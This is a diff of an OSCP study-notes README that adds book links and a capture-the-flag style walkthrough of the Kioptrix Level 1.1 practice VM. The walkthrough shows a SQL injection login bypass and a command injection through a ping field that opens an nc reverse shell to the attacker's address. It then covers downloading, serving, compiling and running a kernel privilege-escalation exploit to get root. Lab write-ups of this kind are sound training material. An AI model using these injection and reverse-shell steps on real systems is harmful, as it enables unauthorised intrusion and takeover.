@@ -2,9 +2,11 @@
 
 Notes of my Offensive Security Certified Professional (OSCP) study plan. :-)
 
+**Last updated**: 2017-07-28
+
 ## OSCP-like VMs:
 - Beginner friendly:
-	- Kioptrix: Level 1 (#1) **[done!]**
+	- Kioptrix: Level 1 (#1)
 	- Kioptrix: Level 1.1 (#2) 
 	- Kioptrix: Level 1.2 (#3) 
 	- Kioptrix: Level 1.3 (#4) 
@@ -30,8 +32,17 @@ Notes of my Offensive Security Certified Professional (OSCP) study plan. :-)
 
 (credits for **@abatchy**)
 
+## Recommended books:
+
+<a href="https://www.amazon.com.br/Penetration-Testing-Hands-Introduction-Hacking/dp/1593275641">Penetration Testing: A Hands-On Introduction to Hacking</a> (+Highly recommended for beginners)  
+<a href="https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441/ref=sr_1_1?ie=UTF8&qid=1492297164&sr=8-1&keywords=hacking">Hacking: The Art of Exploitation, 2nd Edition</a>  
+<a href="https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504/ref=sr_1_2?ie=UTF8&qid=1492297153&sr=8-2&keywords=pentest">Rtfm: Red Team Field Manual</a>  
+<a href="https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470/ref=sr_1_1?ie=UTF8&qid=1492297179&sr=8-1&keywords=the+web+application+hacker%27s+handbook">The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws</a>  
+<a href="https://www.amazon.com/Hacker-Playbook-Practical-Penetration-Testing-ebook/dp/B00J5S9OPU">The Hacker Playbook: Practical Guide To Penetration Testing</a>
+
 ## Links:
 
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ [+Linux privilege escalation]
 http://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob.html  
 https://www.securitysift.com/offsec-pwb-oscp/ [+Scripts]     
 http://hackingandsecurity.blogspot.com.br/2016/04/oscp-related-notes.html  
@@ -201,3 +212,188 @@ ferreirasc@roarrr:~$ ./transopen 0 192.168.3.96 192.168.3.60
 Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
 uid=0(root) gid=0(root) groups=99(nobody)
 ```
+## Kioptrix: Level 1.1 (Level 2)
+
+Having completed Level 1, we will now play Level 2 of the Kioptrix series. This VM can be found at <a href="http://www.kioptrix.com/"/>Kioptrix webpage</a>.
+
+Let's get started scanning my network to discover the Kioptrix 1.1 VM:
+
+```
+root@kali:~# nmap -sn 192.168.3.0/24
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 17:57 EDT
+<-- omitted information -->
+Nmap scan report for 192.168.3.98
+Host is up (0.0035s latency).
+MAC Address: 00:0C:29:57:92:6D (VMware)
+<-- omitted information -->
+Nmap done: 256 IP addresses (11 hosts up) scanned in 8.61 seconds
+```
+The 192.168.3.98 address is mapped to Kioptrix 1.1 on my network. We can do a basic enumeration with nmap to verify the services running on this machine:
+
+```
+root@kali:~# nmap -sS -Pn -sV --script=default 192.168.3.98
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 18:20 EDT
+Nmap scan report for 192.168.3.98
+Host is up (0.0050s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+| ssh-hostkey:
+|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
+|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
+|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind  2 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            643/udp  status
+|_  100024  1            646/tcp  status
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-10-08T00:10:47
+|_Not valid after:  2010-10-08T00:10:47
+|_ssl-date: 2017-07-29T12:20:24+00:00; +1d13h59m41s from scanner time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+631/tcp  open  ipp      CUPS 1.1
+| http-methods:
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+646/tcp  open  status   1 (RPC #100024)
+3306/tcp open  mysql    MySQL (unauthorized)
+MAC Address: 00:0C:29:57:92:6D (VMware)
+
+Host script results:
+|_clock-skew: mean: 1d13h59m40s, deviation: 0s, median: 1d13h59m40s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.47 seconds
+```
+Let's take a look at the web server running on the port 80:
+
+![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image1.png)
+
+It's just a administration login page. Let's try a simple SQL injection trick to bypass the authentication...
+
+![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image2.png)
+
+... and I'm in. :-)
+
+![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image3.png)
+
+Apparently, the only function of this "Administration page" is to ping an address on my network. If the application can ping a machine from this field, it could also execute other commands. Assuming that the input could be an argument for a system() function, for example, if I'm lucky I could take advantage of this to execute a payload invoking a reverse shell just using a simple ";" to separate two commands in a shell:
+
+```bash
+ping 192.168.3.1;nc <my_ip> 4444 -e /bin/sh
+```
+
+I setup a listening on port 4444 to handle the connection of nc, but did not work. 
+
+Maybe I need to provide a complete path to netcat binary (nc binary could not be present on the machine or maybe it's directory would not be listed in $PATH). Let's use *whereis* command to discovering your path:
+
+![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image4.png)
+
+And now we can find your right path:
+
+![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image5.png)
+
+I checked the "-e" option on netcat binary and it was present (just a *"ping 192.168.3.1;/usr/local/bin/nc --help"*)... which saves me a lot of work! hahah
+
+My reverse shell can be invoked right now:
+
+![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image6.png)
+
+And here we go...
+
+```bash
+root@kali:~# nc -lvp 4444
+listening on [any] 4444 ...
+192.168.3.98: inverse host lookup failed: Unknown host
+connect to [192.168.3.92] from (UNKNOWN) [192.168.3.98] 32770
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash -i
+bash: no job control in this shell
+bash-3.00$
+```
+
+I'm in with the apache user context. From here, I often use <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"/>this link</a> as a reference for escalation privilege in *nix environments (thx **@g0tm1k**). Checking the *uname -a* command I figure out that the system is running with a vulnerable kernel version (2.6.9-55.EL), what led me to this exploit-db <a href="https://www.exploit-db.com/exploits/9542/"/>link</a>.
+
+I downloaded the code on my local machine and started a simple web server so my VM can get the code:
+
+```bash
+ferreirasc@roarrr:/tmp$wget https://www.exploit-db.com/download/9542 -O CVE-2009-2698.c
+--2017-07-29 14:00:02--  https://www.exploit-db.com/download/9542
+Resolving www.exploit-db.com... 192.124.249.8
+Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2645 (2.6K) [application/txt]
+Saving to: ‘CVE-2009-2698.c’
+
+CVE-2009-2698.c                             100%[===========================================================================================>]   2.58K  --.-KB/s    in 0s
+
+2017-07-29 14:00:03 (61.5 MB/s) - ‘CVE-2009-2698.c’ saved [2645/2645]
+
+ferreirasc@roarrr:/tmp$ls
+9542                          com.apple.launchd.8JhFxdQVtO/ com.apple.launchd.au2p9lNFwf/ mysql.sock=
+CVE-2009-2698.c               com.apple.launchd.IQnTugcATa/ com.apple.launchd.qWURxTfKJP/ mysql.sock.lock
+ferreirasc@roarrr:/tmp$python -m SimpleHTTPServer 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+``` 
+
+Then, let's compile and test this exploit on the machine:
+
+```bash
+bash-3.00$ cd /tmp
+bash-3.00$ pwd
+/tmp
+bash-3.00$ wget 192.168.3.95:8080/CVE-2009-2698.c
+--09:51:29--  http://192.168.3.95:8080/CVE-2009-2698.c
+           => `CVE-2009-2698.c'
+Connecting to 192.168.3.95:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2,645 (2.6K) [text/plain]
+
+    0K ..                                                    100%    5.18 MB/s
+
+09:51:29 (5.18 MB/s) - `CVE-2009-2698.c' saved [2645/2645]
+
+bash-3.00$ ls -lah
+total 24K
+drwxr-xrwx   4 root   root   4.0K Jul 29 09:51 .
+drwxr-xr-x  23 root   root   4.0K Jul 29 05:39 ..
+-rw-r--r--   1 apache apache 2.6K Jul 29  2017 CVE-2009-2698.c
+drwxrwxrwt   2 root   root   4.0K Jul 29 05:40 .font-unix
+drwxrwxrwt   2 root   root   4.0K Jul 29 05:39 .ICE-unix
+bash-3.00$ gcc --version
+gcc (GCC) 3.4.6 20060404 (Red Hat 3.4.6-8)
+Copyright (C) 2006 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+bash-3.00$ gcc CVE-2009-2698.c -o CVE-2009-2698
+bash-3.00$ ./CVE-2009-2698
+sh: no job control in this shell
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+sh-3.00#
+```
+Congrats, you have **root**! :D
